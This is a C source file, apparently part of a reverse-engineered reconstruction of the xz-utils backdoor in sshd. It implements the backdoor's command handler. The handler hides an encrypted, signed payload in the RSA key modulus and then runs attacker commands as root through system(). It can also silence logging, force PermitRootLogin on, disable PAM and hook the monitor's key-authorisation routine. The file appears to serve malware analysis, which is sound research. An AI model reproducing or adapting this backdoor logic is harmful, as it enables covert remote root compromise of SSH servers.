/**
 * Copyright (C) 2024 Stefano Moioli <smxdev4@gmail.com>
 **/
#include "xzre.h"
#include <assert.h>
#include <openssl/bn.h>
#include <string.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <errno.h>

#define MONITOR_REQ_KEYALLOWED 22

#define SIZE_STEP0 (sizeof(key_payload_hdr_t))
#define SIZE_STEP1 (SIZE_STEP0 + ED448_SIGNATURE_SIZE)
#define SIZE_STEP2 (SIZE_STEP1 + sizeof(cmd_arguments_t))
#define SIZE_HEADERS SIZE_STEP2
#define SIZE_SYSTEM_EXTRA (sizeof(uid_t) + sizeof(gid_t))

// $FIXME: move to xzre.h
extern BOOL sshd_set_log_handler(cmd_arguments_t *args, global_context_t *ctx);

BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
	run_backdoor_commands_data_t f = {0};
	f.p_do_orig = do_orig;

	if(!ctx){
		exit_early:
		if(!do_orig){
			return FALSE;
		}
		goto exit;
	} else if(ctx->disable_backdoor
		|| !rsa
		|| !ctx->imported_funcs
		|| !ctx->imported_funcs->RSA_get0_key
		|| !ctx->imported_funcs->BN_bn2bin
	){
		ctx->disable_backdoor = TRUE;
		goto exit_early;
	}

	if(do_orig){
		do {
			*f.p_do_orig = TRUE;
		
			ctx->imported_funcs->RSA_get0_key(
				rsa, &f.kctx.rsa_n, &f.kctx.rsa_e, NULL);
			if(!f.kctx.rsa_n || !f.kctx.rsa_e) break;
			if(!ctx->imported_funcs) break;
			if(!ctx->imported_funcs->BN_num_bits) break;
			
			int num_n_bits = ctx->imported_funcs->BN_num_bits(f.kctx.rsa_n);
			if(num_n_bits > 0x4000) break;
			
			int num_n_bytes = X_BN_num_bytes(num_n_bits);
			if(num_n_bytes > 536) break;
			
			int rsa_n_length = ctx->imported_funcs->BN_bn2bin(f.kctx.rsa_n, (u8 *)&f.kctx.payload);
			if(rsa_n_length < 0) break;
			if(num_n_bytes < rsa_n_length) break;

			if(rsa_n_length <= sizeof(key_payload_hdr_t)) goto exit;
			// `field_a` cannot be 0
			if(!f.kctx.payload.header.field_a) goto exit;
			// `field_b` cannot be 0
			if(!f.kctx.payload.header.field_b) goto exit;

			u64 cmd_type = f.kctx.payload.header.field_c + (f.kctx.payload.header.field_b * f.kctx.payload.header.field_a);
			if(cmd_type > 3) goto exit;

			if(!ctx->libc_imports) break;
			if(!ctx->libc_imports->getuid) break;
			if(!ctx->libc_imports->exit) break;
			if(!ctx->sshd_log_ctx) break;
			if(ctx->num_shifted_bits != ED448_KEY_SIZE * 8) break;
			*(key_payload_hdr_t *)f.kctx.ivec = f.kctx.payload.header;
			
			if(!secret_data_get_decrypted(f.kctx.ed448_key, ctx)) break;
			// decrypt payload
			if(!chacha_decrypt(
				f.kctx.payload.body.signature,
				num_n_bytes - sizeof(key_payload_hdr_t),
				f.kctx.ed448_key,
				f.kctx.ivec,
				(u8 *)&f.kctx.payload.body,
				ctx->imported_funcs)) break;

			if(!ctx->sshd_sensitive_data) break;
			if(!ctx->imported_funcs) break;

			static_assert(SIZE_HEADERS == 0x87);

			if((num_n_bytes - SIZE_STEP0) < ED448_SIGNATURE_SIZE) break;

			f.data.monitor.cmd_type = cmd_type;
			if((num_n_bytes - SIZE_STEP1) < sizeof(cmd_arguments_t)) break;

			f.kctx.args = f.kctx.payload.body.args;
			
			int hostkey_hash_offset;
			int body_size = num_n_bytes - SIZE_HEADERS;
			int body_offset;
			int size;
			int data_s1, data_s2, payload_size;
			u8 *data_ptr;

			if(cmd_type == 2){
				size = f.kctx.args.u.size;
				if(TEST_FLAG(f.kctx.args.flags1, CMDF_NO_EXTENDED_SIZE)){
					if(f.kctx.args.u.size) break;
					data_s1 = 0;
					size = 0x39;
					data_ptr = f.kctx.payload.body.data;
					data_s2 = 0;
				} else {
					if(TEST_FLAG(f.kctx.args.flags2, CMDF_IMPERSONATE)){
						size = f.kctx.args.u.size + sizeof(uid_t) + sizeof(gid_t);
					}
					data_s1 = size;
					data_ptr = NULL;
					data_s2 = SIZE_HEADERS;
				}
				if(body_size < size) break;

				hostkey_hash_offset = size + sizeof(cmd_arguments_t);
				body_size -= size;
				body_offset = size + SIZE_HEADERS;
				payload_size = size + sizeof(int);

				payload_read:
				f.payload_data_ptr = &f.data.data[4];
				memcpy(
					&f.data.data[4],
					&f.kctx.payload.body.args,
					payload_size + 1);

				f.u.keys.num_host_keys = 0;
				f.u.keys.num_host_pubkeys = 0;

				if(!ctx->sshd_sensitive_data->host_keys) break;
				if(!ctx->sshd_sensitive_data->host_pubkeys) break;
				if(ctx->sshd_sensitive_data->host_keys == ctx->sshd_sensitive_data->host_pubkeys) break;
				if(ctx->sshd_sensitive_data->have_ssh2_key > TRUE) break;

				f.u.keys.num_host_pubkeys = 0;
				if(!count_pointers(
					(void **)ctx->sshd_sensitive_data->host_keys,
					&f.u.keys.num_host_keys,
					ctx->libc_imports)) break;

				if(!count_pointers(
					(void **)ctx->sshd_sensitive_data->host_pubkeys,
					&f.u.keys.num_host_pubkeys,
					ctx->libc_imports)) break;

				if(f.u.keys.num_host_keys != f.u.keys.num_host_pubkeys) break;

				f.ed448_key_ptr = f.u.keys.ed448_key;
				if(!secret_data_get_decrypted(f.u.keys.ed448_key, ctx)) break;
				BOOL sigcheck_result;
				int key_idx = 0;
				do {
					f.key_cur_idx = key_idx;
					if(key_idx >= (u32)f.num_keys) goto disable_backdoor;
					f.key_prev_idx = key_idx;
					sigcheck_result = verify_signature(
						ctx->sshd_sensitive_data->host_pubkeys[key_idx],
						(u8 *)&f.data,
						hostkey_hash_offset + 4,
						0x25,
						f.kctx.payload.body.signature,
						f.ed448_key_ptr,
						ctx
					);
					key_idx = f.key_prev_idx + 1;
				} while(!sigcheck_result);
				ctx->sshd_host_pubkey_idx = f.key_cur_idx;

				if(cmd_type == 2 && TEST_FLAG(f.kctx.args.flags1, CMDF_NO_EXTENDED_SIZE)){
					if(!data_ptr) break;
					int data_offset = 0;
					if(TEST_FLAG(f.kctx.args.flags2, CMDF_IMPERSONATE)){
						data_offset = SIZE_SYSTEM_EXTRA;
						if(f.body_size <= SIZE_SYSTEM_EXTRA) break;
					}
					if(body_size < (data_offset + sizeof(u16))) break;
					u16 *size_location = (u16 *)((u8 *)&f.kctx.payload + data_offset + body_offset);
					data_s1 = data_offset + 2 + *size_location;
					
					if(data_s1 >= f.body_size) break;
					if(f.body_size - data_s1 < ED448_SIGNATURE_SIZE) break;
					if(ctx->payload_data_size < ctx->digest_offset) break;
					u64 delta = ctx->payload_data_size - ctx->digest_offset;
					if(delta < ED448_KEY_SIZE) break;
					if((delta - ED448_SIGNATURE_SIZE) < data_s1) break;

					memcpy(
						ctx->payload_data,
						(u8 *)&f.kctx.payload + body_offset,
						data_s1);

					u8 *signature = (u8 *)&f.kctx.payload + data_s1 + body_offset;

					if(!verify_signature(
						ctx->sshd_sensitive_data->host_pubkeys[ctx->sshd_host_pubkey_idx],
						ctx->payload_data,
						data_s1 + ctx->digest_offset,
						ctx->payload_data_size,
						signature,
						data_ptr,
						ctx
					)) break;
				} else if(data_s2){
					body_offset = SIZE_HEADERS;
					goto after_payload_size_check;
				}

				sshd_offsets_t offsets = {0};
				sshd_offsets_t tmp = {0};
				u8 *extra_data;
				u8 *data_ptr2;
				u64 data_index;
				u32 v;

				do {
					if(f.payload_size < body_offset) break;
					after_payload_size_check:
					if(f.payload_size - body_offset < data_s1) break;
					if(TEST_FLAG(f.kctx.args.flags1, CMDF_SETLOGMASK)
					&& ctx->libc_imports
					&& ctx->libc_imports->setlogmask
					){
						ctx->libc_imports->setlogmask(0x80000000);
						ctx->sshd_log_ctx->syslog_disabled = TRUE;
					} else {
						ctx->sshd_log_ctx->syslog_disabled = FALSE;
						if((f.kctx.args.flags1 & (CMDF_SETLOGMASK|CMDF_8BYTES)) ==  (CMDF_SETLOGMASK|CMDF_8BYTES)){
							break;
						}
						ctx->uid = ctx->libc_imports->getuid();
						if(((TEST_FLAG(f.kctx.args.flags1, 0x10) && !ctx->sshd_log_ctx->unkbool_log_handler)
						|| TEST_FLAG(f.kctx.args.flags1, 0x2))
						&& !sshd_set_log_handler(&f.kctx.args, ctx)
						&& TEST_FLAG(f.kctx.args.flags1, 0x10)) break;


						if(cmd_type){
							if(cmd_type == 1){
								if(!TEST_FLAG(f.kctx.args.flags2, CMDF_IMPERSONATE)
								&& !ctx->sshd_ctx->permit_root_login_ptr) break;
								goto j_payload_main;
							}
							if(cmd_type != 3){
								j_payload_main:
								offsets.value = 0;
								goto payload_main;
							}
							if((f.kctx.args.u.value[0] & 0x80) == 0
							&& !ctx->sshd_ctx->permit_root_login_ptr) break;

							offsets.fields.sshbuf.value = 0;

							if(!TEST_FLAG(f.kctx.args.flags3, 0x20)){
								offsets.value = -1;
								goto payload_main;
							}

							u8 value;
							
							value = -1;
							if(TEST_FLAG(f.kctx.args.flags3, 0x80)){
								value = f.kctx.args.u.value[1];
							}
							offsets.fields.kex.kex_qword_index = value;

							value = -1;
							if(TEST_FLAG(f.kctx.args.flags3, 0x40)){
								value = f.kctx.args.u.value[0] & 0x3F;
							}
							offsets.fields.kex.pkex_offset = value;

							if(TEST_FLAG(f.kctx.args.u.value[0], 0x40)){
								tmp.value = (f.kctx.args.flags2 >> 3) & 7;
								v = (0
									| ((f.kctx.args.flags2 & 7) << 16)
									| (offsets.value & 0xFF00FFFF)
								);
								goto have_offsets;
							}
						} else {
							if(!TEST_FLAG(f.kctx.args.flags2, 0x80)
							&& !ctx->sshd_ctx->permit_root_login_ptr) break;

						
							offsets.fields.sshbuf.value = 0;
							tmp.fields.kex.kex_qword_index = -1;
							if(TEST_FLAG(f.kctx.args.flags2, CMDF_CHANGE_MONITOR_REQ)){
								tmp.value = (*(u16 *)&f.kctx.args.flags3 >> 6) & 0x7F;
							}
							offsets.fields.kex.kex_qword_index = tmp.fields.kex.kex_qword_index;
							tmp.fields.kex.kex_qword_index = -1;

							if(f.kctx.args.flags1 < 1){
								tmp.raw_value = (*(u64 *)&f.kctx.args.flags1 >> 29) & 0x1F;
							}

							offsets.fields.kex.pkex_offset = tmp.fields.kex.kex_qword_index;
							if(TEST_FLAG(f.kctx.args.flags2, 0x4)){
								tmp.fields.kex.kex_qword_index = f.kctx.args.u.value[1] >> 5;

								v = (((f.kctx.args.u.value[1] >> 2) & 7) << 16) | (offsets.value & 0xFF00FFFF);

								have_offsets:
								offsets.value = (tmp.value << 24) | v;

								payload_main:
								ctx->sshd_offsets = offsets;

								data_ptr2 = (u8 *)&f.kctx.payload + body_offset;
								if(ctx->uid){
									// FIXME: memset 11 * 4 bytes
									f.data.monitor.cmd_type = cmd_type;
									f.data.monitor.args = &f.kctx.args;
									f.data.monitor.payload_body = (u8 *)&f.kctx.payload + body_offset;
									f.data.monitor.rsa_n = f.kctx.rsa_n;
									f.data.monitor.rsa_e = f.kctx.rsa_e;
									f.data.monitor.payload_body_size = data_s1;
									f.data.monitor.rsa = f.rsa;
									if(sshd_proxy_elevate(&f.data.monitor, ctx)){
										ctx->disable_backdoor = TRUE;
										*f.p_do_orig = FALSE;
										return TRUE;
									}
									break;
								}

								if(!ctx->libc_imports) break;
								if(!ctx->libc_imports->setresgid) break;
								if(!ctx->libc_imports->setresuid) break;
								if(!ctx->libc_imports->system) break;
								
								if(cmd_type){
									if(cmd_type == 1){
										if(sshd_patch_variables(
											f.kctx.args.flags2 & CMDF_IMPERSONATE,
											TEST_FLAG(f.kctx.args.flags1, CMDF_DISABLE_PAM),
											TEST_FLAG(f.kctx.args.flags2, CMDF_CHANGE_MONITOR_REQ),
											f.kctx.args.u.value[0],
											ctx
										)){
											goto post_exec;
										}
										break;
									} else {
										if(cmd_type != 2){
											if((f.kctx.args.flags2 & CMDF_PSELECT) == CMDF_PSELECT){
												if(!ctx->libc_imports->exit) break;
												if(!ctx->libc_imports->pselect) break;
												f.data.timespec.tv_sec = 5;
												ctx->libc_imports->pselect(
													0,
													NULL, NULL, NULL,
													&f.data.timespec,
													NULL
												);
												ctx->libc_imports->exit(0);
											}
											break;
										}

										uid_t tgt_uid = 0, tgt_gid = 0;
										data_s1 = (short)data_s1;

										if(TEST_FLAG(f.kctx.args.flags1, CMDF_IMPERSONATE)){
											if(data_s1 <= SIZE_SYSTEM_EXTRA) break;
											tgt_uid = *(uid_t *)(data_ptr2 + 0);
											tgt_gid = *(gid_t *)(data_ptr2 + sizeof(uid_t));
											data_s1 -= SIZE_SYSTEM_EXTRA;
											data_index = SIZE_SYSTEM_EXTRA;
										} else {
											tgt_gid = 0;
											data_index = 0;
										}

										u64 packet_data_size;
										if(f.kctx.args.flags1 >= 0){
											packet_data_size = f.kctx.args.u.size;
										} else {
											/** data size field (u16) */
											if(data_s1 <= sizeof(u16)) break;
											packet_data_size = *(u16 *)&data_ptr2[data_index];
											data_s1 -= sizeof(u16);
											data_index += sizeof(u16);
											if(packet_data_size < data_s1) break;
										}
										if(packet_data_size < data_s1) break;
										int res;
										u8 *body_r8 = data_ptr2;
										if(!tgt_gid || (
											// FIXME: verify
											f.body_size = (u64)body_r8,
											res = ctx->libc_imports->setresgid(tgt_gid, tgt_gid, tgt_gid),
											body_r8 = (u8 *)f.body_size,
											res != -1)
										){
											if(!tgt_uid || (
												f.body_size = (u64)body_r8,
												res = ctx->libc_imports->setresuid(tgt_uid, tgt_uid, tgt_uid),
												body_r8 = (u8 *)f.body_size,
												res != -1)
											){
												if(body_r8[data_index]){
													ctx->libc_imports->system((const char *)&body_r8[data_index]);
													goto post_exec;
												}
											}
										}
									}
								} else {
									if(!ctx->sshd_ctx) break;
									if(!ctx->sshd_ctx->mm_answer_keyallowed_ptr) break;
									if(!ctx->sshd_ctx->have_mm_answer_keyallowed) break;

									if(!TEST_FLAG(f.kctx.args.flags2, 0x80)){
										if(!ctx->sshd_ctx->permit_root_login_ptr) break;
										int permit_root_login = *ctx->sshd_ctx->permit_root_login_ptr;
										if(permit_root_login > PERMIT_NO_PASSWD){
											if(permit_root_login != PERMIT_YES) break;
										} else {
											if(permit_root_login < 0) break;
											*ctx->sshd_ctx->permit_root_login_ptr = PERMIT_YES;
										}
									}
									if(TEST_FLAG(f.kctx.args.flags1, CMDF_DISABLE_PAM)){
										if(!ctx->sshd_ctx->use_pam_ptr) break;
										if(*ctx->sshd_ctx->use_pam_ptr > TRUE) break;
										*ctx->sshd_ctx->use_pam_ptr = FALSE;

										f.u.sock.socket_fd = -1;
										if(TEST_FLAG(f.kctx.args.flags1, CMDF_SOCKET_INDEX)){
											if(!sshd_get_usable_socket(
												&f.u.sock.socket_fd,
												(f.kctx.args.flags2 >> 3) & 0xF,
												ctx->libc_imports
											)) break;
										} else {
											if(!sshd_get_client_socket(
												ctx,
												&f.u.sock.socket_fd, 
												1, DIR_READ
											)) break;
										}

										f.unk57 = 0;
										memset(f.u.sock.fd_recv_buf, 0x0, sizeof(f.u.sock.fd_recv_buf));


										if(f.u.sock.socket_fd < 0) break;
										if(!ctx->libc_imports) break;
										if(!ctx->libc_imports->pselect) break;
										if(!ctx->libc_imports->__errno_location) break;

										int res;
										for(;;){
											*(u64 *)&f.u.sock.fd_recv_buf[16] = __builtin_bswap32(0x50);
											memset(&f.data, 0x00, 0x80);
											FD_SET(f.u.sock.socket_fd, (fd_set *)&f.data);
											*(struct timespec *)&f.u.sock.fd_recv_buf[8] = (struct timespec){
												.tv_sec = 0
											};
											if((res = ctx->libc_imports->pselect(
												f.u.sock.socket_fd + 1,
												&f.data.fd_set,
												NULL, NULL,
												(const struct timespec *)&f.u.sock.fd_recv_buf[8],
												NULL
											)) >= 0) break;
											if(*ctx->libc_imports->__errno_location() != EINTR){
												goto bad_data;
											}
										}
										if(!res) break;
										if(!FD_ISSET(f.u.sock.socket_fd, &f.data.fd_set)) break;

										if(fd_read(
											f.u.sock.socket_fd,
											f.u.sock.fd_recv_buf,
											sizeof(u32),
											ctx->libc_imports
										) < 0) break;

										*(u32 *)f.u.sock.fd_recv_buf = __builtin_bswap32(*(u32 *)f.u.sock.fd_recv_buf);
										if((*(u32*)f.u.sock.fd_recv_buf - 1) > 64) break;

										if(fd_read(
											f.u.sock.socket_fd,
											&f.unk57,
											sizeof(u8),
											ctx->libc_imports
										) < 0) break;

										ctx->sock_read_buf_size = *(u32 *)f.u.sock.fd_recv_buf - 1;
										if(fd_read(
											f.u.sock.socket_fd,
											ctx->sock_read_buf,
											ctx->sock_read_buf_size,
											ctx->libc_imports
										) < 0) break;

										if(!ctx->sshd_ctx->mm_answer_keyallowed) break;

										int monitor_reqtype;
										if(TEST_FLAG(f.kctx.args.flags3, 0x3F)){
											monitor_reqtype = 2 * (f.kctx.args.flags3 & 0x3F);
										} else {
											monitor_reqtype = MONITOR_REQ_KEYALLOWED;
											if(ctx->sshd_ctx->mm_answer_keyallowed_ptr){
												int *monitor_reqtype_ptr = (int *)PTRDIFF(ctx->sshd_ctx->mm_answer_keyallowed_ptr, 8);
												monitor_reqtype = *monitor_reqtype_ptr;
											}
										}
										ctx->sshd_ctx->mm_answer_keyallowed_reqtype = monitor_reqtype + 1;

										// replace/hook mm_answer_keyallowed
										ctx->sshd_ctx->mm_answer_keyallowed_ptr = ctx->sshd_ctx->mm_answer_keyallowed;

										post_exec:
										memset(&f.data, 0x00, 0xF0);

										f.data.data[0] = 0x80;
										f.data.data[0xF6] = 8;
										f.data.data[0xFF] = 1;
										BIGNUM *rsa_e, *rsa_n;
										rsa_e = ctx->imported_funcs->BN_bin2bn(
											f.u.sock.fd_recv_buf,
											1, NULL);
										if(rsa_e){
											rsa_n = ctx->imported_funcs->BN_bin2bn(
												(u8 *)&f.data,
												256, NULL
											);
											if(rsa_n){
												if(ctx->imported_funcs->RSA_set0_key(
													f.rsa,
													rsa_n, rsa_e,
													NULL
												) == TRUE) goto disable_backdoor;
												break;
											}
										}

									}
								}


								
							}
						}
					}
				} while(0);
				
			} else {
				if(cmd_type != 3 || TEST_FLAG(f.kctx.args.flags2, 0x40)){
					data_s1 = 0;
					data_s2 = 0;
					body_offset = SIZE_HEADERS;
					data_ptr = NULL;
					f.hostkey_hash_offset = sizeof(cmd_arguments_t);
					payload_size = 4;
					goto payload_read;
				}
				if(f.body_size > 0x2F){
					data_s1 = 0x30;
					data_s2 = SIZE_HEADERS;
					data_ptr = NULL;
					f.hostkey_hash_offset = sizeof(cmd_arguments_t) + 0x30;
					body_offset = SIZE_HEADERS;
					payload_size = 0x34;
					goto payload_read;
				}
			}
			bad_data:
		} while(0);

		// disable backdoor and exit
		disable_backdoor:
		ctx->disable_backdoor = TRUE;

		// exit without disabling backdoor
		exit:
		*do_orig = TRUE;
		return FALSE;
	}

	ctx->disable_backdoor = TRUE;
	return FALSE;
}
